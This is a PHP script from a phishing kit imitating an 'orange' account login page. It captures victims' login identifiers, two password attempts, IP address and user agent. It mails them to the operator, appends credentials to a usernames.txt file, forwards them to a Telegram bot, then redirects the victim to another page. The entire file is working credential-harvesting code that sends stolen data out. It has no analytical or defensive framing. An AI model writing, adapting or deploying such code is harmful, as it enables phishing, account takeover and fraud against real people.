<?php 

session_start();
 include 'email.php';

   $message = "orange 
numero ou mail : ".$_SESSION['login']."
pass try 1 : " .$_POST['pass']. "
pass try 2: ".$_SESSION['pass1']."
\n IP: "._ip()."
User Agent: ".$_SERVER["HTTP_USER_AGENT"]."

";
$Subject="New cc "._ip();
$head="From: vendetta   <log@rezzz.com>";
mail($my_mail,$Subject,$message,$head);
   file_put_contents("usernames.txt", " \n numero ou mail : ".$_POST['login'].  " \n mot de passe : " . $_POST['pass'],
       FILE_APPEND);
   
   include 'function.php';
  
 sendMessage($chat_id, $message, $bot_token);

header('Location: espace.php');

exit();
